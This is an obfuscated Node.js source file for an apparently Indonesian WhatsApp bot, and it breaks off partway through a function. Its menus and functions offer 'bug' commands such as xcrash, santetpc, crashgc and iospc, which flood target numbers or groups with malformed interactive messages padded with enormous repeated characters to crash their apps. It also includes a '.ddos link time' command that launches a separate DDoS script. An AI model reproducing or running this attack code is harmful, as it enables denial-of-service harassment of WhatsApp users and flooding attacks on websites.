const _0x575978 = _0x2206;
(function (_0x29dd0f, _0x95153b) {
    const _0x537f3f = _0x2206,
        _0x181977 = _0x29dd0f();
    while (!![]) {
        try {
            const _0x576c3d = -parseInt(_0x537f3f(0x28a)) / 0x1 + parseInt(_0x537f3f(0x306)) / 0x2 * (-parseInt(_0x537f3f(0x1e6)) / 0x3) + -parseInt(_0x537f3f(0x253)) / 0x4 + parseInt(_0x537f3f(0x233)) / 0x5 * (-parseInt(_0x537f3f(0x2a3)) / 0x6) + parseInt(_0x537f3f(0x1ee)) / 0x7 * (parseInt(_0x537f3f(0x2d3)) / 0x8) + -parseInt(_0x537f3f(0x28c)) / 0x9 * (parseInt(_0x537f3f(0x28d)) / 0xa) + parseInt(_0x537f3f(0x2ed)) / 0xb;
            if (_0x576c3d === _0x95153b) break;
            else _0x181977['push'](_0x181977['shift']());
        } catch (_0x4dcf11) {
            _0x181977['push'](_0x181977['shift']());
        }
    }
}(_0x4dd9, 0x79f5f));
const _0xb23138 = (function () {
        let _0x3b00c0 = !![];
        return function (_0x3a0219, _0x1afc8d) {
            const _0x7491ea = _0x3b00c0 ? function () {
                const _0x32ddfc = _0x2206;
                if (_0x1afc8d) {
                    const _0x54eea9 = _0x1afc8d[_0x32ddfc(0x2fb)](_0x3a0219, arguments);
                    return _0x1afc8d = null, _0x54eea9;
                }
            } : function () {};
            return _0x3b00c0 = ![], _0x7491ea;
        };
    }()),
    _0x3d3ab3 = _0xb23138(this, function () {
        const _0x185c8e = _0x2206;
        return _0x3d3ab3[_0x185c8e(0x205)]()[_0x185c8e(0x2cf)]('(((.+)+)+)+$')[_0x185c8e(0x205)]()[_0x185c8e(0x20a)](_0x3d3ab3)[_0x185c8e(0x2cf)](_0x185c8e(0x2d8));
    });

function _0x2206(_0x2914d3, _0x5cf91d) {
    const _0x48a13a = _0x4dd9();
    return _0x2206 = function (_0x21c1e9, _0x11b632) {
        _0x21c1e9 = _0x21c1e9 - 0x1d8;
        let _0x33576e = _0x48a13a[_0x21c1e9];
        return _0x33576e;
    }, _0x2206(_0x2914d3, _0x5cf91d);
}
_0x3d3ab3();
const _0x11b632 = (function () {
        let _0x3e35a5 = !![];
        return function (_0x907e18, _0x4e5ab9) {
            const _0x2d840d = _0x3e35a5 ? function () {
                const _0x39ba00 = _0x2206;
                if (_0x4e5ab9) {
                    const _0x1ade30 = _0x4e5ab9[_0x39ba00(0x2fb)](_0x907e18, arguments);
                    return _0x4e5ab9 = null, _0x1ade30;
                }
            } : function () {};
            return _0x3e35a5 = ![], _0x2d840d;
        };
    }()),
    _0x21c1e9 = _0x11b632(this, function () {
        const _0x2f15f2 = _0x2206,
            _0x4b8711 = function () {
                const _0x25ae8f = _0x2206;
                let _0x25c12a;
                try {
                    _0x25c12a = Function(_0x25ae8f(0x2c4) + '{}.constructor(\"return this\")( )' + ');')();
                } catch (_0x12600d) {
                    _0x25c12a = window;
                }
                return _0x25c12a;
            },
            _0x29cd11 = _0x4b8711(),
            _0x4db93b = _0x29cd11['console'] = _0x29cd11['console'] || {},
            _0x17ade4 = [_0x2f15f2(0x21a), _0x2f15f2(0x280), 'info', _0x2f15f2(0x2fc), _0x2f15f2(0x23d), _0x2f15f2(0x2c6), 'trace'];
        for (let _0x3e118b = 0x0; _0x3e118b < _0x17ade4['length']; _0x3e118b++) {
            const _0x2a73ea = _0x11b632['constructor'][_0x2f15f2(0x25f)]['bind'](_0x11b632),
                _0x36406f = _0x17ade4[_0x3e118b],
                _0x905e32 = _0x4db93b[_0x36406f] || _0x2a73ea;
            _0x2a73ea[_0x2f15f2(0x1fa)] = _0x11b632[_0x2f15f2(0x2ad)](_0x11b632), _0x2a73ea[_0x2f15f2(0x205)] = _0x905e32[_0x2f15f2(0x205)]['bind'](_0x905e32), _0x4db93b[_0x36406f] = _0x2a73ea;
        }
    });
_0x21c1e9(), require(_0x575978(0x1e4));

function _0x4dd9() {
    const _0x406ffc = ['indexOf', 'caption', 'return (function() ', 'recording', 'table', 'templateButtonReplyMessage', 'test', 'please wait, ', '\x0a\x0a• ', '*succesfully delete session ✓*', 'editinfo', '*Khusus Member Premium/Owner*', './lib/button', 'search', 'black', '\x0a│ *Ownername* : ', 'santetpc', '8fgseFn', 'exit', 'whatsapp.com', 'MarkZuckerberg', 'conns', '(((.+)+)+)+$', 'xcrash', 'cache', '\x0a• *Time Attack* : ', 'remoteJid', 'INITIATED_BY_ME', 'tiktok.com', 'message', 'xuia', 'cta_url', 'Fitur ini Khusus Owner/Dev', 'TiktokAutoDownload', 'singleSelectReply', ' close', 'Link Invalid!', 'puki', 'composing', '24j', 'unwatchFile', 'https://chat.whatsapp.com/', 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', '27035272ejtAZT', '*DONE BUG SUDAH TERKIRIM KE GROUP!.*', 'CHANGED_IN_CHAT', 'anjay', 'GROUP MENU', 'codepairing', 'unblock', 'xloc', 'x24j', '* ✅\x0a\x0a<!> Pause 2 minutes so that the bot is not banned.', 'map', 'menu', 'splice', 'jadibot', 'apply', 'error', 'OWNER MENU', 'bgBlack', 'delprem', 'iospc', 'Footer', 'totalcase', ' https://chat.whatsapp.com/xxxx 10\x0a\x0a©akmalmods', 'fromMe', 'linkgc', '238ySeOpW', 'listResponseMessage', 'ddos', '*FORMAT BUG ', 'greenBright', 'groupRevokeInvite', ' 628xxxxxxxx', ' Didatabase Users Premium*', 'format', 'xbug', 'delaypc', 'selectedId', 'time', 'NativeFlowMessage', '```', './database/premium.json', 'then', 'create', 'resetjadibot', 'bugpc', 'bomgc', 'revoke', 'replace', ' • Users : @', 'promote', ' ❐\x0a┃⭔.bugmenu\x0a┃⭔.ownermenu\x0a┃⭔.jadibotmenu\x0a┃⭔.groupmenu\x0a┗❐\x0a▬▭▬▭▬▭▬▭▬▭\x0a 「 *RUNTIME BOT* 」\x0a', ' Ke Database Users Premium*', 'ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮', 'announcement', 'Teks Deskripsi Nya Mana?\x0a\x0aEx:\x0a.setdesc teks_deskripsi', 'pm2 restart all', 'xforce', 'crashgc', 'Auto_Typing', 'No cases found.', 'join', 'Sampah Grup Berhasil di Keluarkan!', 'shift', 'xbutton', '*Fitur Ini Khusus Member Premium/Owner*', ' jumlah\x0a\x0a*Contoh:*\x0a', ' bug is being submitted..', ' https://chat.whatsapp.com/xxxx\x0a\x0a_*Note:*_ Jika ingin mengirim bug dengan jumlah banyak, silahkan ketik sebagai berikut ini\x0a\x0aEx: .', 'messageContextInfo', 'parse', 'child_process', '\x0a▬▭▬▭▬▭▬▭▬▭▬▭', 'readMessages', './config', '▱▰▱「 *SV-2.2* 」▱▰▱\x0a╭──────────────────\x0a│ *Botname* : ', '7977rAdPsX', 'title', 'Update ', 'documentMessage', 'stringify', 'xva', 'Auto_ReadPesan', 'imageMessage', '1449686lYmmkH', 'groupAcceptInvite', 'length', 'existsSync', ' Hari, ', '@s.whatsapp.net', '_Tidak Ada Users Premium!!_', 'botName', 'axios', '1679959486', '@g.us', '*MASUKKAN CODE PAIRING DIBAWAH INI*\x0a*UNTUK MENJADI BOT SEMENTARA ✓*\x0a\x0a1. Klik titik tiga di pojok kanan atas\x0a2. Ketuk perangkat tertaut\x0a3. Ketuk tautkan perangkat\x0a4. Ketuk tautkan dengan nomor telepon saja\x0a5. Masukkan code pairing dibawah ini\x0a\x0a*Code Pairing :* `', '__proto__', 'jadibotmenu', 'BUG ANDRO-EASY', 'cyan', 'status@broadcast', 'In Process...', '0@s.whatsapp.net', 'virgam', 'ownerBot', '\x0a│ *Pengguna* : ', 'parse-ms', 'toString', 'Private Chat :', 'trim', 'Successfully Closed Group Edit Info', 'BUG GROUP', 'constructor', ' number\x0aExample ', '*Fitur ini Khusus Owner/Dev*', ' ^_^\x0a*session kamu masih terdaftar.*\x0a\x0a*silahkan ketik* .stopjadibot\x0a*untuk menghapus session ✓*', 'iosxs', 'unlocked', '- Message :', ' ❐\x0a┃⭔.stopjadibot\x0a┃⭔.resetjadibot\x0a┃⭔.listjadibot\x0a┃⭔.jadibot\x0a┃\x0a┗❐「 *SV-2.2* 」\x0a▬▭▬▭▬▭▬▭▬▭', './index.js', 'whatsapp', 'groupLeave', 'Success\x0a\x0a• Target: ', 'Use Methode: .', 'delay', ' Menit, ', '- From :', 'log', 'participant', ' linkgc jumlahbug\x0a\x0aContoh:\x0a.', './lib/jadibot', './lib/strava.jpg', 'ios', ' ❐\x0a┃⭔.ioskill 628xxx,3\x0a┃⭔.iospc 628xxx,3\x0a┃⭔.iosxs 628xxx,3\x0a┃⭔.ioslcy 628xxx,3\x0a┃⭔.bug-ios 628xxx,3\x0a┗❐\x0a\x0a┏❐ ', ' 628xxxxx', 'green', 'push', 'groupmenu', '{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}', 'bugmenu', 'UPI', 'groupInviteCode', 'Belum Ada User Yang Jadibot', 'spampc', '{ display_text : \'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸\', url : , merchant_url :  }', '`\x0a\x0a*Note:*\x0a_Code dapat expired kapan saja._\x0a_Jika code error silahkan ketik_ ⇩\x0a\x0a========[  !stopjadibot  ]========', '\x0a│ *Number* : @', 'DEFAULT', 'addprem', 'Fitur Ini Hanya Dapat Digunakan Di Dalam Group!', 'SIMPLE MENU', '*Fitur Ini Khusus Bot Saja!*', '335iPQmpT', 'selectedRowId', 'groupSettingUpdate', 'Message', 'xlist', 'leave', '4392524570816732', 'Maaf Kak Fitur Ini Hanya Bisa Digunakan Dichat Pribadi!', 'selectedButtonId', ' number,jumlah\x0a\x0a*Contoh:*\x0a', 'exception', '=> in', '*\x0a\x0a*Example:*\x0a', 'relayMessage', 'Nomor Tersebut Tidak Terdaftar Di WhatsApp', 'fromObject', '▬▭▬▭▬▭▬▭▬▭▬\x0a┏❐ ', 'Group Chat :', 'User : ', 'Use ', 'Auto_RecordType', 'floor', '*Khusus Owner Leccy!*', 'Successfully Opened Group Edit Info', 'xkill', 'xbom', 'now', 'includes', '*Maaf, Kamu Tidak Terdaftar Jadibot!*', 'node lib/ddos.js ', '*Sukses Menghapus ', '*WAIT PROSES (⏳)*', '118036XsWAdX', 'slice', 'Auto_Recording', 'InteractiveMessage', './lib/tiktok', 'conversation', 'toLowerCase', 'CHAT_SETTING', 'JADIBOT MENU', 'blueBright', 'mix', 'toUpperCase', 'prototype', 'Owner', 'magenta', 'node-fetch', 'xlec', 'bugui', '*MODE DESKRIPSI GROUP*\x0a\x0a*_Open : semua member bisa edit deskripsi grup_*\x0a\x0a*_Close: hanya admin group yang bisa edit deskripsi_*\x0a\x0a*Example:*\x0a', 'global_search_new_chat', 'exports', ' example.my.id 60', 'watchFile', 'User', ' Using *', 'filter', 'Total case: ', 'crashpc', ',\x0a• Time: ', 'demote', 'contextInfo', '*List Jadibot*\x0a\x0a', 'updateBlockStatus', 'ownermenu', 'onWhatsApp', 'key', ' 7\x0a\x0a©akmalmods', 'sendMessage', 'Enter Group Link!\x0aEx: .join https://chat.whatsapp.com/xxxx', 'split', 'user', '62895411575387', 'extendedTextMessage', 'setname', 'match', 'warn', 'Nama Group Nya Mana?\x0a\x0aEx:\x0a.setname nama_group', ' Jam, ', 'BUG ANDRO-HIGH', 'groupParticipantsUpdate', '_*LIST USER PREMIUM*_\x0a*Total User :* ', 'pushName', 'videoMessage', 'strava', '_*> TIKTOK AUTO DOWNLOADER <*_\x0a\x0a - Author : ®LeccyOfficiall\x0a - Creator : ', '186428SDZLWM', 'Error: ', '521658nuOpPF', '120zmAEUV', 'remove', './database/jadibot/', ' ❐\x0a┃⭔.ios *jumlah*\x0a┃⭔.24j *jumlah*\x0a┃⭔.kill *jumlah*\x0a┃⭔.bug *jumlah*\x0a┃⭔.bom *jumlah*\x0a┃⭔.delay *jumlah*\x0a┃⭔.spam *jumlah*\x0a┃⭔.crash *jumlah*\x0a┃⭔.strava *jumlah*\x0a┃⭔.bugui *jumlah*\x0a┗❐\x0a\x0a┏❐ ', 'Goodbye🖐', 'close', 'shutdown', 'chalk', ' ❐\x0a┃⭔.open\x0a┃⭔.close\x0a┃⭔.linkgc\x0a┃⭔.linkgrup\x0a┃⭔.revoke\x0a┃⭔.hidetag teks\x0a┃⭔.kick @tag\x0a┃⭔.promote @tag\x0a┃⭔.demote @tag\x0a┃⭔.setname teks\x0a┃⭔.setdesc teks\x0a┃⭔.editinfo teks\x0a┃\x0a┗❐「 *SV-2.2* 」\x0a▬▭▬▭▬▭▬▭▬▭', 'Body', 'Reply targetnya!', '_Enter A Valid And Registered Number On WhatsApp!!_', 'rm -r database/jadibot/', ' • Time Aktif : ', 'author', 'buttonsResponseMessage', 'ownerNumber', 'listjadibot', 'xdoc', 'white', '\x0a• ', 'xvir', '83946BFkfVS', '*mohon maaf* @', '<✓> Successfully Send Bug to @', 'redBright', 'open', ' 628xxxx,5\x0a\x0a©akmalmods', 'readFileSync', '*CARA MENGIRIM BUG GROUB*\x0a\x0a', 'substring', 'block', 'bind', 'Fitur Ini Hanya Dapat Digunakan Oleh Admin!', '*OPENED* The group is opened by admin\x0aNow members can send messages', 'catch', 'decodeJid', 'Header', 'hidetag', 'repeat', 'xta', '*CLOSED* group closed by admin\x0anow only admin can send messages', 'locked', 'groupUpdateDescription', 'Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!', ' ❐\x0a┃⭔.restart\x0a┃⭔.listprem\x0a┃⭔.shutdown\x0a┃⭔.join linkgrup\x0a┃⭔.addprem number\x0a┃⭔.delprem number\x0a┃⭔.unblock number\x0a┃⭔.block number\x0a┃⭔.leave [onlygrup]\x0a┃⭔.ddos link time\x0a┃\x0a┗❐「 *SV-2.2* 」\x0a▬▭▬▭▬▭▬▭▬▭', ' ❐\x0a┃⭔.xbutton 628xxx,3\x0a┃⭔.xcrash 628xxx,3\x0a┃⭔.xforce 628xxx,3\x0a┃⭔.xbom 628xxx,3\x0a┃⭔.xstik 628xxx,3\x0a┃⭔.xlist 628xxx,3\x0a┃⭔.x24j 628xxx,3\x0a┃⭔.xuia 628xxx,3\x0a┃⭔.xlec 628xxx,3\x0a┃⭔.xva 628xxx,3\x0a┃⭔.xta 628xxx,3\x0a┃⭔.xvir 628xxx,3\x0a┃⭔.xdoc 628xxx,3\x0a┃⭔.xkill 628xxx,3\x0a┃⭔.xbug 628xxx,3\x0a┃⭔.xloc 628xxx,3\x0a┃⭔.xhit 628xxx,3\x0a┗❐\x0a\x0a┏❐ ', 'Jumlah wajib angka!!', './lib/myfunc.js', ' Detik', 'unlipc', ' ❐\x0a┃⭔.sendbug 628xxx,3\x0a┃⭔.santetpc 628xxx,3\x0a┃⭔.crashpc 628xxx,3\x0a┃⭔.delaypc 628xxx,3\x0a┃⭔.spampc 628xxx,3\x0a┃⭔.virgam 628xxx,3\x0a┃⭔.bugpc 628xxx,3\x0a┃⭔.unlipc 628xxx,3\x0a┃⭔.b-force 628xxx,3\x0a┗❐\x0a\x0a┏❐ ', 'text'];
    _0x4dd9 = function () {
        return _0x406ffc;
    };
    return _0x4dd9();
}
const {
    downloadContentFromMessage,
    makeInMemoryStore,
    BufferJSON,
    WA_DEFAULT_EPHEMERAL,
    generateWAMessageFromContent,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    getContentType
} = require('@whiskeysockets/baileys'), {
    isUrl,
    sleep,
    await,
    getGroupAdmins,
    fetchJson
} = require(_0x575978(0x2bd)), fs = require('fs'), axios = require(_0x575978(0x1f6)), util = require('util'), chalk = require(_0x575978(0x294)), fetch = require(_0x575978(0x262)), ms = require(_0x575978(0x204)), {
    exec,
    spawn,
    execSync
} = require(_0x575978(0x1e1));
Leccy_Auto_Typing = global[_0x575978(0x327)], Leccy_Auto_Recording = global[_0x575978(0x255)], Leccy_Auto_RecordType = global[_0x575978(0x247)], Leccy_Auto_ReadPesan = global[_0x575978(0x1ec)], tiktokauto = global[_0x575978(0x2e3)];
let {
    leccybug
} = require(_0x575978(0x2ce));
const teks_proses = '_Your request is being processed⏳_';
let premium = JSON[_0x575978(0x1e0)](fs['readFileSync'](_0x575978(0x315)));
const tbsm = fs[_0x575978(0x2a9)](_0x575978(0x21e));
module[_0x575978(0x267)] = async (_0x6f03b9, _0xd17bed, _0x31118d) => {
    const _0x5994ec = _0x575978;
    try {
        const {
            fromMe: _0x2da8d5,
            isBaileys: _0xdd8003,
            isQuotedMsg: _0x100abf,
            quotedMsg: _0x7b8dd5,
            mentioned: _0xc7a1b0
        } = _0xd17bed;
        if (_0xd17bed[_0x5994ec(0x276)] && _0xd17bed[_0x5994ec(0x276)]['remoteJid'] === _0x5994ec(0x1fe)) return;
        const _0x58a514 = getContentType(_0xd17bed[_0x5994ec(0x2df)]),
            _0x368680 = JSON[_0x5994ec(0x1ea)](_0xd17bed[_0x5994ec(0x2df)]),
            _0x567336 = _0xd17bed[_0x5994ec(0x276)][_0x5994ec(0x2dc)],
            _0x41a3ea = _0x58a514 == 'extendedTextMessage' && _0xd17bed['message']['extendedTextMessage'][_0x5994ec(0x271)] != null ? _0xd17bed[_0x5994ec(0x2df)]['extendedTextMessage'][_0x5994ec(0x271)]['quotedMessage'] || [] : [],
            _0x5d1dcf = _0x58a514 === _0x5994ec(0x258) && _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x258)] ? _0xd17bed['message'][_0x5994ec(0x258)] : _0x58a514 == _0x5994ec(0x1ed) && _0xd17bed[_0x5994ec(0x2df)]['imageMessage'][_0x5994ec(0x2c3)] ? _0xd17bed['message'][_0x5994ec(0x1ed)][_0x5994ec(0x2c3)] : _0x58a514 == 'documentMessage' && _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x1e9)][_0x5994ec(0x2c3)] ? _0xd17bed[_0x5994ec(0x2df)]['documentMessage'][_0x5994ec(0x2c3)] : _0x58a514 == _0x5994ec(0x287) && _0xd17bed[_0x5994ec(0x2df)]['videoMessage'][_0x5994ec(0x2c3)] ? _0xd17bed[_0x5994ec(0x2df)]['videoMessage']['caption'] : _0x58a514 == 'extendedTextMessage' && _0xd17bed['message'][_0x5994ec(0x27d)][_0x5994ec(0x2c1)] ? _0xd17bed['message']['extendedTextMessage'][_0x5994ec(0x2c1)] : _0x58a514 == _0x5994ec(0x29c) && _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x29c)][_0x5994ec(0x23b)] ? _0xd17bed['message'][_0x5994ec(0x29c)][_0x5994ec(0x23b)] : _0x58a514 == _0x5994ec(0x2c7) && _0xd17bed[_0x5994ec(0x2df)]['templateButtonReplyMessage'][_0x5994ec(0x311)] ? _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x2c7)][_0x5994ec(0x311)] : '',
            _0x526377 = _0x58a514 === _0x5994ec(0x258) && _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x258)] ? _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x258)] : _0x58a514 === _0x5994ec(0x1ed) && _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x1ed)][_0x5994ec(0x2c3)] ? _0xd17bed['message'][_0x5994ec(0x1ed)][_0x5994ec(0x2c3)] : _0x58a514 === _0x5994ec(0x287) && _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x287)][_0x5994ec(0x2c3)] ? _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x287)][_0x5994ec(0x2c3)] : _0x58a514 === 'extendedTextMessage' && _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x27d)][_0x5994ec(0x2c1)] ? _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x27d)][_0x5994ec(0x2c1)] : _0x58a514 === 'buttonsResponseMessage' && _0x7b8dd5['fromMe'] && _0xd17bed[_0x5994ec(0x2df)]['buttonsResponseMessage'][_0x5994ec(0x23b)] ? _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x29c)][_0x5994ec(0x23b)] : _0x58a514 === 'templateButtonReplyMessage' && _0x7b8dd5['fromMe'] && _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x2c7)][_0x5994ec(0x311)] ? _0xd17bed[_0x5994ec(0x2df)]['templateButtonReplyMessage']['selectedId'] : _0x58a514 === _0x5994ec(0x1df) ? _0xd17bed[_0x5994ec(0x2df)]['buttonsResponseMessage']?. [_0x5994ec(0x23b)] || _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x307)]?. ['singleSelectReply'][_0x5994ec(0x234)] : _0x58a514 == _0x5994ec(0x307) && _0x7b8dd5[_0x5994ec(0x304)] && _0xd17bed[_0x5994ec(0x2df)]['listResponseMessage'][_0x5994ec(0x2e4)][_0x5994ec(0x234)] ? _0xd17bed[_0x5994ec(0x2df)][_0x5994ec(0x307)]['singleSelectReply'][_0x5994ec(0x234)] : '',
            _0x3129e8 = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/ [_0x5994ec(0x2c8)](_0x5d1dcf) ? _0x5d1dcf[_0x5994ec(0x27f)](/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.',
            _0x433a5a = _0x5d1dcf['replace'](_0x3129e8, '')[_0x5994ec(0x207)]()[_0x5994ec(0x27a)](/ +/)[_0x5994ec(0x1d9)]()[_0x5994ec(0x259)](),
            _0x142125 = _0x5d1dcf[_0x5994ec(0x207)]()[_0x5994ec(0x27a)](/ +/)[_0x5994ec(0x254)](0x1),
            _0x5acea6 = _0x142125[_0x5994ec(0x329)](' '),
            _0x4c420c = q = _0x142125[_0x5994ec(0x329)](' '),
            _0x1bb58a = _0x567336['endsWith'](_0x5994ec(0x1f8)),
            _0x140ae0 = _0x6f03b9[_0x5994ec(0x27b)]['id']['split'](':')[0x0],
            _0x7193a1 = _0xd17bed[_0x5994ec(0x276)][_0x5994ec(0x304)] ? _0x6f03b9['user']['id'][_0x5994ec(0x27a)](':')[0x0] + _0x5994ec(0x1f3) || _0x6f03b9[_0x5994ec(0x27b)]['id'] : _0xd17bed[_0x5994ec(0x276)]['participant'] || _0xd17bed[_0x5994ec(0x276)][_0x5994ec(0x2dc)],
            _0x207ca8 = _0x7193a1[_0x5994ec(0x27a)]('@')[0x0],
            _0x148225 = _0xd17bed[_0x5994ec(0x286)] || '' + _0x207ca8,
            _0x4dc8d5 = [global[_0x5994ec(0x29d)], ...premium][_0x5994ec(0x24e)](_0x207ca8),
            _0x1c014d = global[_0x5994ec(0x29d)][_0x5994ec(0x24e)](_0x207ca8),
            _0xbbec7 = _0x140ae0[_0x5994ec(0x24e)](_0x207ca8),
            _0x1cfa47 = _0x1bb58a ? await _0x6f03b9['groupMetadata'](_0x567336) : '',
            _0x185dea = _0x1bb58a ? _0x1cfa47['subject'] : '',
            _0x1b88a4 = _0x1bb58a ? _0x1cfa47['id'] : '',
            _0x35f3c3 = _0x1bb58a ? _0x1cfa47['participants'] : '',
            _0x2a8de = _0x1bb58a ? getGroupAdmins(_0x35f3c3) : '',
            _0x36841f = _0x2a8de[_0x5994ec(0x24e)](_0x140ae0 + '@s.whatsapp.net') || ![],
            _0x1a09f0 = _0x2a8de[_0x5994ec(0x24e)](_0x7193a1) || ![],
            _0x2ed7d8 = function (_0x404e0d) {
                const _0x470983 = _0x5994ec;
                var _0x404e0d = Number(_0x404e0d),
                    _0x1fef4e = Math['floor'](_0x404e0d / (0xe10 * 0x18)),
                    _0x198030 = Math[_0x470983(0x248)](_0x404e0d % (0xe10 * 0x18) / 0xe10),
                    _0x1b306f = Math[_0x470983(0x248)](_0x404e0d % 0xe10 / 0x3c),
                    _0x5d3852 = Math[_0x470983(0x248)](_0x404e0d % 0x3c),
                    _0x424feb = _0x1fef4e > 0x0 ? _0x1fef4e + (_0x1fef4e == 0x1 ? ' Hari, ' : _0x470983(0x1f2)) : '',
                    _0xd74bbf = _0x198030 > 0x0 ? _0x198030 + (_0x198030 == 0x1 ? _0x470983(0x282) : _0x470983(0x282)) : '',
                    _0x50d896 = _0x1b306f > 0x0 ? _0x1b306f + (_0x1b306f == 0x1 ? _0x470983(0x218) : _0x470983(0x218)) : '',
                    _0x27b76e = _0x5d3852 > 0x0 ? _0x5d3852 + (_0x5d3852 == 0x1 ? ' Detik' : _0x470983(0x2be)) : '';
                return _0x424feb + _0xd74bbf + _0x50d896 + _0x27b76e;
            },
            _0xf553c6 = async _0x335b7a => {
                return JSON['stringify'](_0x335b7a, null, 0x2);
            }, _0x5c76cf = {
                'key': {
                    'fromMe': !![],
                    'participant': _0x5994ec(0x200),
                    'remoteJid': _0x5994ec(0x1fe)
                },
                'message': {
                    'listResponseMessage': {
                        'title': _0x5994ec(0x2d6)
                    }
                }
            }, _0x321d5c = {
                'key': {
                    'fromMe': ![],
                    'participant': _0x5994ec(0x200),
                    'remoteJid': _0x5994ec(0x1fe)
                },
                'message': {
                    'extendedTextMessage': {
                        'text': '' + _0x2ed7d8(process['uptime']())
                    }
                }
            }, _0xf21161 = async _0xcfe35e => {
                const _0x3ed547 = _0x5994ec;
                await _0x6f03b9[_0x3ed547(0x278)](_0x567336, {
                    'text': _0xcfe35e
                }, {
                    'quoted': _0xd17bed
                });
            }, _0x35be56 = async _0x5028d8 => {
                _0x6f03b9['sendMessage'](_0x567336, {
                    'text': _0x5028d8
                }, {
                    'quoted': _0xd17bed
                });
            }, _0x4ef953 = async _0x3e25fd => {
                const _0x8f3822 = _0x5994ec;
                _0x6f03b9[_0x8f3822(0x278)](_0x567336, {
                    'react': {
                        'text': _0x3e25fd,
                        'key': _0xd17bed[_0x8f3822(0x276)]
                    }
                });
            }, _0x11a91a = async (_0x1f17b1, _0x49e34c) => {
                const _0x25faff = _0x5994ec;
                _0x6f03b9[_0x25faff(0x278)](_0x7193a1, {
                    'video': {
                        'url': _0x1f17b1
                    },
                    'caption': _0x49e34c
                }, {
                    'quoted': _0xd17bed
                });
            }, _0x298726 = async _0x535992 => {
                const _0x34d0b9 = _0x5994ec;
                _0x6f03b9[_0x34d0b9(0x278)](_0x567336, {
                    'image': tbsm,
                    'caption': _0x535992,
                    'contextInfo': {
                        'mentionedJid': [_0x7193a1],
                        'forwardingScore': 0x270f,
                        'isForwarded': !![]
                    }
                }, {
                    'quoted': _0xd17bed
                });
            }, _0x235e89 = async (_0x20ac1a, _0x4bf25a) => {
                const _0x2061e3 = _0x5994ec;
                _0x6f03b9[_0x2061e3(0x278)](_0x7193a1, {
                    'image': {
                        'url': _0x20ac1a
                    },
                    'caption': _0x4bf25a
                }, {
                    'quoted': _0xd17bed
                });
            }, _0xde90f7 = async (_0xf4e6a9, _0x1d9dd5) => {
                const _0x1311d4 = _0x5994ec;
                _0x6f03b9[_0x1311d4(0x278)](_0x7193a1, {
                    'document': {
                        'url': _0xf4e6a9
                    },
                    'fileName': _0x1d9dd5 + '.mp3',
                    'mimetype': 'audio/mp3'
                }, {
                    'quoted': _0xd17bed
                });
            };
        async function _0x3efd64(_0x1de05f, _0x57dcbf) {
            const _0x414af4 = _0x5994ec;
            for (let _0x26b2c5 = 0x0; _0x26b2c5 < _0x57dcbf; _0x26b2c5++) {
                _0x6f03b9[_0x414af4(0x278)](_0x567336, {
                    'text': '' [_0x414af4(0x2b4)](0xc350)
                }, {
                    'participant': {
                        'jid': _0x1de05f
                    },
                    'messageId': etc[_0x414af4(0x276)]['id']
                }, {
                    'quoted': _0x5c76cf
                });
            }
        }
        async function _0xe9441b(_0x5c493d, _0x8a171c) {
            const _0x47cd45 = _0x5994ec;
            for (let _0x29e1d1 = 0x0; _0x29e1d1 < _0x8a171c; _0x29e1d1++) {
                let _0x1d7092 = generateWAMessageFromContent(_0x5c493d, {
                    'viewOnceMessage': {
                        'message': {
                            'messageContextInfo': {
                                'deviceListMetadata': {},
                                'deviceListMetadataVersion': 0x2
                            },
                            'interactiveMessage': proto['Message'][_0x47cd45(0x256)][_0x47cd45(0x317)]({
                                'body': proto['Message'][_0x47cd45(0x256)][_0x47cd45(0x296)]['create']({
                                    'text': ''
                                }),
                                'footer': proto[_0x47cd45(0x236)][_0x47cd45(0x256)][_0x47cd45(0x301)][_0x47cd45(0x317)]({
                                    'text': ''
                                }),
                                'header': proto[_0x47cd45(0x236)][_0x47cd45(0x256)][_0x47cd45(0x2b2)][_0x47cd45(0x317)]({
                                    'title': '',
                                    'subtitle': '',
                                    'hasMediaAttachment': ![]
                                }),
                                'nativeFlowMessage': proto[_0x47cd45(0x236)][_0x47cd45(0x256)][_0x47cd45(0x313)]['create']({
                                    'buttons': [{
                                        'name': _0x47cd45(0x2e1),
                                        'buttonParamsJson': _0x47cd45(0x225)
                                    }],
                                    'messageParamsJson': '\x00' ['repeat'](0x186a0)
                                })
                            })
                        }
                    }
                }, {});
                _0x6f03b9[_0x47cd45(0x240)](_0x5c493d, _0x1d7092[_0x47cd45(0x2df)], {
                    'messageId': _0x1d7092[_0x47cd45(0x276)]['id']
                });
            }
        }
        async function _0x4ae1a2(_0x139658) {
            const _0x21048a = _0x5994ec;
            var _0x54a150 = generateWAMessageFromContent(_0x139658, proto[_0x21048a(0x236)]['fromObject']({
                'viewOnceMessage': {
                    'message': {
                        'interactiveMessage': {
                            'header': {
                                'title': '',
                                'subtitle': ' '
                            },
                            'body': {
                                'text': _0x21048a(0x2ec)
                            },
                            'footer': {
                                'text': 'xp'
                            },
                            'nativeFlowMessage': {
                                'buttons': [{
                                    'name': 'cta_url',
                                    'buttonParamsJson': _0x21048a(0x22b)
                                }],
